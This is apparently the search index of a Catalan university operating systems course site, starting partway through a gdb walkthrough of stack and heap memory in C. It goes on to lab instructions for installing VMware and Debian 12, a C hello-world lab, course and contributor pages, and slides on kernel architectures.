variable matrix, que és un punter a punters per a la matriu dinàmica.\n\n(gdb) print matrix\n$6 = (int **) 0xaaaaaaaa0854 &lt;main&gt;\n(gdb) print &matrix\n$7 = (int ***) 0xfffffffff2b8\n(gdb) print &matrix[0]\n$8 = (int **) 0xaaaaaaaa0854 &lt;main&gt;\n(gdb) print &matrix[1]\n$9 = (int **) 0xaaaaaaaa085c &lt;main+8&gt;\n\n\n\n\n\n\nNotaObservació\n\n\n\nObserva que l’adreça de matrix també està a la pila d’execució (al voltant de 0xaaaaaaaa0854). I les adreces de matrix[0] i matrix[1] són consecutives (incrementen en 8 bytes, que és la mida d’un punter). Podeu confirmar la mida d’un punter al gdb amb: print sizeof(int*).\n\n\n\nAnem a veure l’adreça on apunta matrix:\n(gdb) x/6x matrix\n0xaaaaaaaa0854 &lt;main&gt;:  0xa9ba7bfd  0x910003fd  0xf9000bf3  0x90000000\n0xaaaaaaaa0864 &lt;main+16&gt;:   0x912e6000  0x910083e\n\n\n\n\n\n\n\nNotaObservació\n\n\n\nEl contingut de l’adreça on apunta matrix sembla ser una adreça de memòria (però encara no hem fet el malloc, així que no és vàlida encara).\n(gdb) x/6x 0xa9ba7bfd\n0xa9ba7bfd: Cannot access memory at address 0xa9ba7bfd\n\n\n\nAra anem a afegir un altre punt d’interrupció just després del primer malloc, per veure com canvia la variable matrix després de l’assignació de memòria:\n(gdb) break 20\nBreakpoint 3 at 0xaaaaaaaa0944: file lab01.c, line 20.\nContinuem l’execució fins a aquest punt:\n(gdb) c \nContinuing.\n\nBreakpoint 3, main () at lab01.c:20\n20          matrix[i] = malloc(3 * sizeof(int));  // espai per 3 enters\nAra podem inspeccionar la variable matrix de nou:\n(gdb) print matrix\n$11 = (int **) 0xaaaaaaac16b0\n(gdb) x/20x matrix\n0xaaaaaaac16b0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16c0: 0x00000000  0x00000000  0x00020941  0x00000000\n0xaaaaaaac16d0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16f0: 0x00000000  0x00000000  0x00000000  0x00000000\n(gdb) print &matrix[0]\n$12 = (int **) 0xaaaaaaac16b0\n(gdb) print &matrix[1]\n$13 = (int **) 0xaaaaaaac16b8\n(gdb) x/6x 0xaaaaaaac16b0\n0xaaaaaaac16b0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16c0: 0x00000000  0x00000000\n(gdb) x/6x 0xaaaaaaac16b8\n0xaaaaaaac16b8: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16c8: 0x00020941  0x00000000\nEl malloc ha assignat memòria per a 2 punters (matrix[0] i matrix[1]), però encara no hem assignat memòria per a les files de la matriu (això ho fem en el següent bucle for).\nSi fem continue una altra vegada, s’executarà la primera iteració del bucle for que assigna memòria per a la primera fila de la matriu dinàmica.\n(gdb) x/20x matrix\n0xaaaaaaac16b0: 0xaaac16d0  0x0000aaaa  0x00000000  0x00000000\n0xaaaaaaac16c0: 0x00000000  0x00000000  0x00000021  0x00000000\n0xaaaaaaac16d0: 0x00000000  0x00000000  0x00000000  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000  0x00020921  0x00000000\n0xaaaaaaac16f0: 0x00000000  0x00000000  0x00000000  0x00000000\n\nAra posem un breakpoint a la línia 31 break 31 (al printf de la matriu dinàmica) i continuem l’execució: continue.\n(gdb) x/20x matrix\n0xaaaaaaac16b0: 0xaaac16d0  0x0000aaaa  0xaaac16f0  0x0000aaaa\n0xaaaaaaac16c0: 0x00000000  0x00000000  0x00000021  0x00000000\n0xaaaaaaac16d0: 0x00000001  0x00000002  0x00000003  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000  0x00000021  0x00000000\n0xaaaaaaac16f0: 0x00000004  0x00000005  0x00000006  0x00000000\n(gdb) print &matrix[0][0]\n$12 = (int *) 0xaaaaaaac16d0\n(gdb) print &matrix[1][0]\n$13 = (int *) 0xaaaaaaac16f0\nObservem que ara matrix[0] i matrix[1] apunten a adreces vàlides a la memòria heap (0xaaaaaaac16d0 i 0xaaaaaaac16f0 respectivament).\nAnem veure el contingut de la memòria a partir d’aquestes adreces:\n(gdb) x/6x 0xaaaaaaac16d0\n0xaaaaaaac16d0: 0x00000001  0x00000002  0x00000003  0x00000000\n0xaaaaaaac16e0: 0x00000000  0x00000000\n(gdb) x/6x 0xaaaaaaac16f0\n0xaaaaaaac16f0: 0x00000004  0x00000005  0x00000006  0x00000000\n0xaaaaaaac1700: 0x00000000  0x00000000\n(gdb) x/6dw &matrix[0][0]\n0xaaaaaaac16d0: 1   2   3   0\n0xaaaaaaac16e0: 0   0\n(gdb) x/6dw &matrix[1][0]\n0xaaaaaaac16f0: 4   5   6   0\n0xaaaaaaac1700: 0   0\nAnem a veure el contingut de la memòria a partir d’aquestes adreces:\n(gdb) print matrix[0][0]\n$14 = 1\n(gdb) print matrix[0][1]\n$15 = 2\n(gdb) print matrix[0][2]\n$16 = 3\n(gdb) print matrix[1][0]\n$17 = 4\n(gdb) print matrix[1][1]\n$18 = 5\n(gdb) print matrix[1][2]\n$19 = 6\n\nEn aquest punt, podem veure la mida actual de la memòria heap:\n\n(gdb) print mallinfo()\n$15 = {arena = 135168, ordblks = 1, smblks = 0, hblks = 0, hblkhd = 0, usmblks = 0, fsmblks = 0, uordblks = 1792,\n  fordblks = 133376, keepcost = 133376}\n\n\n\n\n\n\nNotaObservació\n\n\n\nObservem que la memòria utilitzada a la heap (uordblks) és de 1792 bytes, que correspon a les dues files de 3 enters cadascuna (2 * 3 * 4 = 24 bytes) més l’overhead del malloc.\n\n\n\nFinalment, posem un breakpoint just abans del return 0; (línia 38) i continuem l’execució fins a aquest punt:\n\n(gdb) break 38\nBreakpoint 4 at 0xaaaaaaaa0968: file lab01.c, line 38.\n(gdb) c\nContinuing.\n\nBreakpoint 4, main () at lab01.c:38\n38      return 0;\n\nAra podem inspeccionar les variables locals de nou:\n\n(gdb) info locals\nm = {{1, 2, 3}, {4, 5, 6}}\nmatrix = 0xaaaaaaac16b0\nAra bé com que hem fet els free de la memòria dinàmica, si mirem la mida de la heap veiem que ha disminuït i que tot i que les adreces matrix[0] i matrix[1] encara són les mateixes, el contingut de la memòria ja no és vàlid:\n(gdb) print mallinfo()\n(gdb) x/6x 0xaaaaaaac16d0\n0xaaaaaaac16d0: 0xaaaaaac1  0x0000000a  0xac976b95  0xe5702979\n0xaaaaaaac16e0: 0x00000000  0x00000000\n(gdb) x/6x 0xaaaaaaac16f0\n0xaaaaaaac16f0: 0x0006bc11  0x0000aaa0  0xac976b95  0xe5702979\n0xaaaaaaac1700: 0x00000000  0x00000000",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 · Punters·Heap·Stack en C"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html",
    "href": "labs/01-introduction/lab01.html",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "",
    "text": "Instal·lar el programari de virtualització VMWare Workstation Pro o VMWare Fusion.\nInstal·lar una màquina virtual basada en un sistema operatiu Linux.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#objectius",
    "href": "labs/01-introduction/lab01.html#objectius",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "",
    "text": "Instal·lar el programari de virtualització VMWare Workstation Pro o VMWare Fusion.\nInstal·lar una màquina virtual basada en un sistema operatiu Linux.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#installació-del-hypervisor-vmware-workstation-pro-o-vmware-fusion",
    "href": "labs/01-introduction/lab01.html#installació-del-hypervisor-vmware-workstation-pro-o-vmware-fusion",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "Instal·lació del Hypervisor (VMWare Workstation Pro o VMWare Fusion)",
    "text": "Instal·lació del Hypervisor (VMWare Workstation Pro o VMWare Fusion)\nAquestes instruccions et guiaran a través del procés per crear un compte a Broadcom i descarregar una de les versions gratuïtes de VMware Workstation Pro (per a Windows) o VMware Fusion (per a macOS).\n\nRegistra’t per a un compte gratuït a Broadcom: Per accedir a les descàrregues de programari de VMware, necessites un compte a la plataforma de Broadcom.\n\nDirigeix-te a la pàgina de registre de Broadcom: https://profile.broadcom.com/web/registration\nIntrodueix la teva adreça de correu electrònic, realitza la verificació de seguretat i fes clic a Next \nIntrodueix el codi de verificació que has rebut al teu correu electrònic. Fes clic a Verify per continuar. \nCompleta el formulari de registre amb la teva informació personal i crea una contrasenya. Fes clic a Create Account per completar el registre. \nUn cop completat el registre, visualitzaràs un missatge de registre correcte. I us demanarà si voleu completar el perfil. Seleccioneu, I will do it later per continuar. \n\nAccedeix a les descàrregues gratuïtes de VMware:\n\nVes a la pàgina de login de Broadcom: https://profile.broadcom.com/web/login\nInicia sessió amb el teu correu electrònic i la contrasenya que has creat.\nVes directament a la secció de descàrregues a (https://support.broadcom.com/group/ecx/free-downloads). \nSelecciona VMware Workstation Pro o VMware Fusion segons el teu sistema operatiu (Windows o macOS). En el meu cas, utiltizo Mac, així que seleccionaré VMware Fusion.\nSeleccioneu la versió que voleu descarregar. En aquest cas, podem seleccionar la versió més recent. \nEn la pàgina següent:\n\nFes clic a l’enllaç de termes i condicions per que s’activi el checkbox de l’acceptació.\nAcceptar els termes i condicions.\nFes clic a descàrrega per començar a descarregar el fitxer d’instal·lació. \n\n\nInstal·la VMware Workstation Pro o VMware Fusion.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#descarrega-de-la-imatge-iso-de-debian-12.5.0",
    "href": "labs/01-introduction/lab01.html#descarrega-de-la-imatge-iso-de-debian-12.5.0",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "Descarrega de la imatge ISO de Debian 12.5.0",
    "text": "Descarrega de la imatge ISO de Debian 12.5.0\n\nVes a la pàgina de descàrrega de Debian 12.5.0: https://get.debian.org/images/archive/12.5.0/\nSelecciona la imatge ISO per a la teva arquitectura (amd64 o arm64). La majoria dels vostres ordinadors tenen processadors amd64 (Intel o AMD). Els processadors ARM són més comuns en dispositius mòbils i en els nous Mac amb xips M.\nSeleccioneu la carpeta iso-cd.\nSeleccioneu el fitxer debian-12.5.0-x-netinst.iso. On x és l’arquitectura del vostre sistema (amd64 o arm64).\n\n💡 Nota:\nLa imatge netinst és una imatge d’instal·lació mínima que descarrega els paquets necessaris durant la instal·lació. Això permet personalitzar la instal·lació i seleccionar els paquets que voleu instal·lar.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#configuració-de-la-màquina-virtual-amb-vmware",
    "href": "labs/01-introduction/lab01.html#configuració-de-la-màquina-virtual-amb-vmware",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "Configuració de la màquina virtual amb VMWare",
    "text": "Configuració de la màquina virtual amb VMWare\n\nSelecciona l’opció Create a New Virtual Machine a VMWare Workstation Pro o VMWare Fusion.\nSelecciona Install from disc or image. \nSelecciona la imatge ISO de Debian 12. \nConfigura els recursos de la màquina virtual. \nAnomena la màquina virtual i selecciona la ubicació on es guardarà. Per exemple, podeu posar el nom vm-curs0-debian12 i seleccionar una ubicació al vostre directori d’usuari.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#installació-del-sistema-operatiu",
    "href": "labs/01-introduction/lab01.html#installació-del-sistema-operatiu",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "Instal·lació del sistema operatiu",
    "text": "Instal·lació del sistema operatiu\n\nUn cop iniciada la màquina virtual, podeu seleccionar la opció Install o bé Graphical install. \nEn aquest tutoriral, seleccionarem la opció Graphical install per a una instal·lació més amigable. La principal diferència entre les dues opcions és l’entorn gràfic.\nSelecciona l’idioma d’instal·lació. \nPodeu seleccionar l’idioma que vulgueu per a la instal·lació. En aquest cas, seleccionarem l’idioma Català.\nSelecciona la ubicació geogràfica. \nEn aquest cas, seleccionarem la ubicació Espanya.\nSelecciona la disposició del teclat. \nEn aquest cas, seleccionarem la disposició de teclat Català. Això ens asegurarà un mapeig correcte del teclat.\nEspereu que el sistema carregui els components necessaris. \nConfigura la xarxa.\n\nEl primer pas és configurar el nom d’amfitrió o hostname. Aquest nom permet identificar de forma única el vostre sistema. Podeu deixar el nom per defecte o canviar-lo al vostre gust.\n\n\nEn aquest cas, hem canviat el nom d’amfitrió a vm-curs0-debian12, però podeu posar el nom que vulgeu com debianlab, etc.\n\nEl segon pas és configurar el domini de la xarxa. Aquest pas el podeu deixar en blanc si no teniu un domini específic. O bé, podem utilitzar .local com a domini local per identicar que el servidor pertany a la xarxa local.\n\n\nConfigura l’usuari administrador.\n\nEn aquest punt, heu de tenir en compte que si no poseu cap contrasenya, es crearà l’usuari normal amb permisos de sudo i això us permetra executar comandes amb privilegis d’administrador.\nSi poseu una contrasenya, aquesta serà la contrasenya de l’usuari root i no es crearà un usuari normal amb permisos de sudo. I tampoc s’instal·larà el paquet sudo.\n\n⚠️ Compte\nCom utilitzarem les màquines virtuals com a laboratoris de pràctiques, no cal que poseu una contrasenya molt segura. Podeu utilitzar una com a 1234. Però, recordeu que en un entorn real, la seguretat és molt important i cal utilitzar contrasenyes segures.\n\nConfigura un usuari normal.\n\nNom complet: Podeu posar el vostre nom complet o el que vulgueu.\n\n\n\nNom d’usuari: Podeu posar el vostre nom d’usuari o el que vulgueu.\n\n\n\nContrasenya: El mateix que per l’usuari root.\n\n\nConfigura la zona horària.\n\nEn aquest cas, seleccionarem la zona horària de Madrid.\nConfigura el disc dur.\n\nParticionament: En aquest curs, el tema del particionament no és molt important. Per tant, podeu fer servir la configuració per defecte més senzilla (Guiat - utilitzar el disc sencer). Aquesta configuració crearà les particions necessàries per a l’instal·lació del sistema.\n\n\n\nSelecciona el disc on instal·lar el sistema. En el meu cas, només tinc un disc virtual amb l’etiqueta /dev/nvme0n1. L’etiqueta indica el tipus de disc (NVMe) i el número de disc (1). Es possible tenir altres etiquetes com /dev/sda per discos SATA o /dev/vda per discos virtuals.\n\n\n\nParticions: Podeu seleccionar (Tots els fitxers en una partició) per simplificar la gestió i evitar problemes podeu seleccionar aquesta opció. Aquesta opció crearà una sola partició per a tot el sistema.\n\n\n\nConfirmeu els canvis. En aquest punt, el sistema crearà les particions necessàries:\n\nLa primera partició serà la partició /boot on es guardaran els fitxers per arrancar el sistema.\nLa segona partició serà la partició / on es guardaran els fitxers del sistema.\nLa tercera partició serà la partició de swap on es guardaran les dades de la memòria virtual.\n\n\n\nℹ️ Què és la partició swap?\nLa swap és una partició especial que s’utilitza com a memòria virtual quan la memòria RAM s’omple. Aquesta partició permet alliberar memòria RAM i evitar que el sistema es bloquegi.\n\n\n\nEscriu els canvis al disc.\n\n\nEspera que s’instal·li el sistema.\n\nConfigura el gestor de paquets.\n\nAnalitzar els discos de la instal·lació. Aquest pas permet seleccionar els discos on es troben els paquets d’instal·lació. Normalment, aquest pas no cal modificar-lo.\n\n\n\nConfigura el gestor de paquets. En aquest cas, seleccionarem el servidor de paquets més proper a la nostra ubicació.\n\nFiltrar els servidors de paquets per ubicació. \nSeleccionar el servidor de paquets. \n\n\n👀 Nota:\nA vegades, els servidors de paquets poden estar saturats o no funcionar correctament. En aquest cas, podeu seleccionar un servidor alternatiu o provar més tard.\n\nConfigura el proxy. Si esteu darrere d’un proxy, podeu configurar-lo en aquest pas.\n\n\nℹ️ Què és un proxy?\nUn proxy és un servidor intermediari entre el vostre sistema i Internet. Aquest servidor pot ser utilitzat per controlar l’accés a Internet, per protegir la vostra privacitat o per accelerar la connexió a Internet. Les peticions de connexió a Internet es fan a través del servidor proxy, que actua com a intermediari i reenvia les peticions al servidor de destinació. Per exemple, en una empresa, el proxy pot ser utilitzat per controlar l’accés a Internet dels empleats i protegir la xarxa interna de possibles amenaces.\n\n\nEspera que s’instal·lin els paquets.\n\nConfigura el paquet popularity-contest.\n\nAquest paquet permet enviar informació anònima sobre els paquets instal·lats al servidor de Debian per millorar la selecció de paquets i la qualitat dels paquets. Podeu seleccionar si voleu participar en aquest programa o no.\n\n\nSelecció de programari. En aquest punt podeu seleccionar si voleu un servidor en mode text o amb interfície gràfica. També us permet seleccionar si voleu instal·lar els serveis web i ssh al servidor i finalment si voleu les utilitats estàndard del sistema. Seleccionarem el servidor en mode text, el servei SSH activat i les utilitats estàndard del sistema.\n\n\nℹ️ Què és un servidor en mode text?\nUn servidor en mode text és un servidor que no té una interfície gràfica. Això significa que tota la interacció amb el servidor es fa a través de la línia de comandes. Aquest tipus de servidor és molt comú en entorns de producció, ja que consumeix menys recursos i és més segur que un servidor amb interfície gràfica.\n\n\n\nℹ️ Què és el servei SSH?\nEl servei SSH (Secure Shell) és un protocol de xifratament que permet connectar-se de forma segura a un servidor remot. Aquest servei és molt utilitzat per administrar servidors a distància, ja que permet accedir al servidor de forma segura i xifratada.\n\nEspera que s’instal·li el programari.\n\nInstal·la el gestor d’arrancada GRUB. \nInstal·lació acabada. Un cop finalitzada la instal·lació, el sistema es reiniciarà i podreu accedir al GRUB per seleccionar el sistema operatiu. \nEl GRUB us permet accedir al sistema operatiu. En aquest cas, seleccionarem Debian GNU/Linux. La resta d’opcions les veurem més endavant en el curs.\n\n\nℹ️ Què és el GRUB?\nEl GRUB és un gestor d’arrencada que permet seleccionar el sistema operatiu que volem iniciar. Aquest gestor és molt útil en sistemes amb múltiples sistemes operatius o múltiples versions del mateix sistema operatiu.\n\nInicieu sessió amb l’usuari i la contrasenya que heu configurat durant la instal·lació.\n\n\n\n\n\n\n\nAlerta\n\n\n\nQuan escriviu la contrasenya, no es mostrarà cap caràcter a la pantalla. Això és normal en sistemes Unix/Linux per motius de seguretat. Simplement escriviu la contrasenya i premeu Enter.\n\n\nTanqueu la sessió amb la comanda exit.\nInicieu sessió amb l’usuari root i la contrasenya que heu configurat durant la instal·lació.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab01.html#exercicis-adicionals",
    "href": "labs/01-introduction/lab01.html#exercicis-adicionals",
    "title": "Laboratori 1: Instal·lació de Debian 12",
    "section": "Exercicis adicionals",
    "text": "Exercicis adicionals\n\nInstal·leu altres màquines virtuals amb altres sistemes operatius en mode gràfic com:\n\nUbuntu 24.04 LTS\nFedora 39",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 1 · Instal·lació i configuració d'un entorn Linux"
    ]
  },
  {
    "objectID": "labs/01-introduction/lab03.html",
    "href": "labs/01-introduction/lab03.html",
    "title": "Laboratori 3: Hola món en C a Debian",
    "section": "",
    "text": "Per instal·lar el llenguatge de programació C a Debian, pots seguir aquests passos:\n\nConnecta una terminal al teu sistema Debian i obra una sessió com a usuari root.\nsu -\nInstal·la el paquet build-essential, que inclou les eines i llibreries necessàries per compilar i construir programes en C. Aquest paquet inclou el compilador GCC, que és comunament utilitzat per programar en C.\napt install build-essential -y\nTorna a la sessió com a usuari normal i comprova que el compilador GCC s’ha instal·lat correctament.Verifica la instal·lació comprovant la versió del compilador GCC instal·lat.\nexit\ngcc --version\n\nAra ja pots escriure i compilar programes en C al teu sistema Debian. Com anteriorment, has vinculat VSCode amb la màquina virtual debianlab ara pots escriure i compilar programes en C des de l’entorn de desenvolupament VSCode.\nAnem a crear un programa senzill en C, compilar-lo i executar-lo. Aquest programa mostrarà un missatge de benvinguda a la terminal.\n\nFer click al boto Obre la Carpeta.\n\n\n\nObre Carpeta\n\n\nSelecciona la carpeta de l’usuari. (/home/jordi). Això obrirà la carpeta de l’usuari a la barra lateral esquerra de VSCode.\n\n\n\nSelecciona Carpeta\n\n\n\nConfirmeu que confieu en l’origen de la carpeta seleccionada.\n\n\n\n\nConfia en la carpeta\n\n\n\nCom a resultat, la carpeta de l’usuari s’obrirà a la barra lateral esquerra de VSCode.\n\n\n\n\nCarpeta de l’usuari\n\n\nCrea un directori utilitzant el gestor de fitxers de VSCode. Per exemple, crea un directori anomenat hello a la carpeta de l’usuari.\n\n\n\nCrea directori\n\n\nCrear un nou fitxer anomenat hola.c dins del directori hello.\n\n\n\nCrea fitxer\n\n\nUtilitza l’editor de text de VSCode per escriure el següent codi en C al fitxer creat.\n#include &lt;stdio.h&gt;\n\nint main() {\n    printf(\"Hola, benvingut al DebianLab!\\n\");\n    return 0;\n}\n\n\n\nEscriu codi\n\n\nPodeu seleccionar instal·lar l’extensió C/C++ per a VSCode tal com us recomana l’editor.\nUn cop instal·lat, torneu a la pestanya de l’editor de hola.c i guardeu el fitxer.\n\n😵‍💫 Trobleshooting:\nSi quan guardeu el fitxer, VSCode us mostra la llibreria stdio.h amb vermell indicant que no la troba, simplement, tanqueu la sessió a VSCode i torneu-la a iniciar. Això solucionarà el problema.\n\nSi no teniu oberta la terminal, podeu obrir-ne una des de VSCode. Feu clic a Terminal i seleccioneu Nova Terminal.\n\n\n\nTerminal oberta\n\n\nAra podeu compilar el programa des de la terminal de VSCode.\nNavega fins al directori hello.\ncd hello\nCompila el programa amb la comanda gcc.\ngcc -o hola hola.c\nExecuta el programa.\n./hola\n\n\n\n\nResum de comandes",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 3 · Hola món en C a Debian"
    ]
  },
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "SO 105012: Sistemes Operatius",
    "section": "",
    "text": "Benvinguts al curs de Sistemes Operatius (SO) del Grau d’Enginyeria Informàtica de la Universitat de Lleida (UdL). Aquest curs se centra en l’estudi dels principis fonamentals de disseny i implementació en l’enginyeria de sistemes operatius. Les classes es basen en l’estudi de sistemes operatius basats en UNIX i en tasques de recerca. Alguns dels temes tractats inclouen la gestió de processos, els mecanismes de comunicació, la planificació de tasques i la gestió de memòria. Les tasques de laboratori individuals requereixen codificar en C mitjançant crides al sistema i scripts de shell.\n\n\n\nCourse Title\nOperating Systems\n\n\nSemester\n1st Semester of the Bachelor’s Degree in Computer Engineering\n\n\nCourse Year\nSecond Year\n\n\nProfessor\nJordi Mateo\n\n\nSchedule\n📅\n\n\nCourse Guide\n📚\n\n\nSchool\n\n\n\nUniversity\n\n\n\nDepartment"
  },
  {
    "objectID": "CONTRIBUTORS.html",
    "href": "CONTRIBUTORS.html",
    "title": "SO - Fall 2025",
    "section": "",
    "text": "Samuel Ntim Jakari: Sakytsu\nEric Pérez Llerena: epl1185.\nMarc Nicolás: mnsanch\nOriol Escolà Serra: oriolescserr\nAbderrahman Albaitar: AbderrahmanAlbaitar\nEnric Tomàs: etj2\nHéctor Morales Viñolo: RecklessCat55\nPau Ribalta: PauRibalta\nJonay Criado Castellano: JonayCC\nOriol Lladó: orillad\nLaia Croce: LaiaCroce\nDavid Rivas: drr11\nIbai Soler: ibsorn\nJordi Armenteras Negredo : Shattenente\nAlbert Mas Ramon : irAlbertZ1\nNassreddine El Baghdadi: Nasser-maker-del\nKenny Henares: kennyhenares7-ui\nEnric Alguacil Lapina enricalguacil\nBiel Riba bielrb06\nEric Buenavida Crespo: EricBuenavidaUdL\nIkram Maaroufi: Ikram692\nAlejandro Matas: TheAleMax13"
  },
  {
    "objectID": "slides/02-kernel.html#què-és-el-nucli-dun-sistema-operatiu",
    "href": "slides/02-kernel.html#què-és-el-nucli-dun-sistema-operatiu",
    "title": "Kernel de Linux",
    "section": "Què és el nucli d’un sistema operatiu?",
    "text": "Què és el nucli d’un sistema operatiu?\nEl nucli del SO és la capa més crítica i conté les rutines de gestió del sistema relacionades amb els recursos físic. Es troba sempre carregat a la Memòria.\nFuncionalitats del nucli\n\nEl nucli té la capacitat d’assignar i desassignar la CPU als usuaris i processos per evitar que acaparin el recurs de forma ininterrompuda.\nEl nucli evita que els usuaris i processos accedeixin a dades d’altres usuaris.\nEl nucli evita els usuaris modifíquin el codi i les dades del nucli.\nEl nucli evita que els usuaris realitzin E/S il·legals.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#qué-és-la-dualitat",
    "href": "slides/02-kernel.html#qué-és-la-dualitat",
    "title": "Kernel de Linux",
    "section": "Qué és la dualitat?",
    "text": "Qué és la dualitat?\n\n\nMode kernel\n\nEl codi que s’executa en aquest mode té accés a qualsevol adreça de Memòria i a tots els recursos hardware.\nSi un programa falla en aquest mode, tot el sistema quedarà aturat.\n\nMode usuari\n\nEl codi no té accés directe a Memòria ni als recursos hardware.\nSi un programa falla en aquest mode, únicament atura el programa i no el sistema.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#repte-separació-de-responsabilitats",
    "href": "slides/02-kernel.html#repte-separació-de-responsabilitats",
    "title": "Kernel de Linux",
    "section": "Repte: Separació de responsabilitats",
    "text": "Repte: Separació de responsabilitats\n\nQuina és la millor manera d’organitzar/separar totes les parts del sistema operatiu?\n\n\nCom organitzem les parts?\nDefinició de polítiques: Quines seran les accions a realitzar.\nCom cooperen les parts?\nMecanismes: Com es duran a terme aquestes accions.\n\n\nClassificació (Estructura Interna)\n\nMonolítics\nCapes\nMicro-kernel\nHíbrids\nHypervisors",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-simple",
    "href": "slides/02-kernel.html#estructura-simple",
    "title": "Kernel de Linux",
    "section": "Estructura simple",
    "text": "Estructura simple\n\n\nCaracterístiques\n\nEstructura no ben definida.\nEl SO és un conjunt de procediments que es poden cridar sense cap limitació.\nSon sistemes complexos; difícil d’implementar i de depurar.\nNo tenen mode dual.\nExemple: MS-DOS\n\n\n\n\n\n\n\nEls sistemes operatius com MS-DOS o Unix (original) no tenien estructures ben definides.\nNo hi havia cap mode d’execució de la CPU (usuari i nucli), de manera que els errors en les aplicacions podrien provocar un bloqueig de tot el sistema.\nQuan es va escriure DOS originalment, els seus desenvolupadors no tenien ni idea de quant de gran i important esdevindria. Va ser escrit per uns quants programadors en un temps relativament curt, sense el benefici de les tècniques modernes d’enginyeria de programari, i després va anar creixent amb el pas del temps fins a superar les seves expectatives originals. No divideix el sistema en subsistemes i no distingeix entre modes d’usuari i nucli, cosa que permet a tots els programes accedir directament al maquinari subjacent.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-monolítica",
    "href": "slides/02-kernel.html#estructura-monolítica",
    "title": "Kernel de Linux",
    "section": "Estructura Monolítica",
    "text": "Estructura Monolítica\n\n\nEls serveis d’usuari i serveis del kernel s’implementen sota el mateix espai d’adreces.\n\n\n\n\n\n👍 Les funcionalitats (serveis) s’invoquen amb crides al sistema.\n👍 Els controladors de dispositius es carreguen al nucli i passen a formar part del nucli.\n👎 Difícil d’entendre, modificar i mantenir.\n👎 Poc fiable (sense aïllament entre els mòduls del sistema)",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-per-capes",
    "href": "slides/02-kernel.html#estructura-per-capes",
    "title": "Kernel de Linux",
    "section": "Estructura per capes",
    "text": "Estructura per capes\n\n\n\n\n\n👍 Independència entre les capes.\n👍 Permet descriure el SO de forma clara.\n👍 Simplicitat en la construcció i depuració.\n👎 Rendiment.\n👎 És difícil definir les capes a causa de les limitacions per comunicar-se.\n\n\n\nUn exemple és UNIX, aquest sistema operatiu, creat per Dennis Ritchie i Ken Thompson als anys 70, va adoptar una arquitectura en capes més simple que Multics. Aquestes capes són: Hardware, Kernel, Shell i Aplicacions. Un exemple és: NetBSD.\nPermet que cada anell tingui un conjunt de funcions i responsabilitats clarament definides, i que cada anell pugui comunicar-se amb els anells adjaçents.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#estructura-microkernel",
    "href": "slides/02-kernel.html#estructura-microkernel",
    "title": "Kernel de Linux",
    "section": "Estructura Microkernel",
    "text": "Estructura Microkernel\n\n\n\nEls serveis d’usuari i serveis del kernel s’implementi en diferents espais d’adreces.\nComunicació entre els mòduls utilitza el pas de missatges.\n👍 El kernel té una mida més reduïda.\n👍 Portable, segur, fiable i extensible.\n👎 Reducció de la velocitat d’execució i del rendiment.\n\n\n\n\n\n\n\nEl sistema operatiu MacOS, desenvolupat per Apple, va aprofitar l’estabilitat i seguretat del nucli Mach com a base per al seu sistema operatiu. En aquest sistema, serveis com la gestió de memòria, la gestió de fitxers i la xarxa es van traslladar fora del nucli, a servidors externs, millorant la estabilitat, fiabilitat i modularitat del sistema.\nSistemes en temps real com QNX, o dispotius encastats poden utilitzar aquesta arquitectura.",
    "crumbs": [
      "Diapositives",
      "Unitat 02 · Kernel de Linux"
    ]
  },
  {
    "objectID": "slides/02-kernel.html#microkernel-vs-monolític",
    "href": "slides/02-kernel.html#microkernel-vs-monolític",
    "title": "Kernel de Linux",
    "section": "Microkernel vs Monolític",
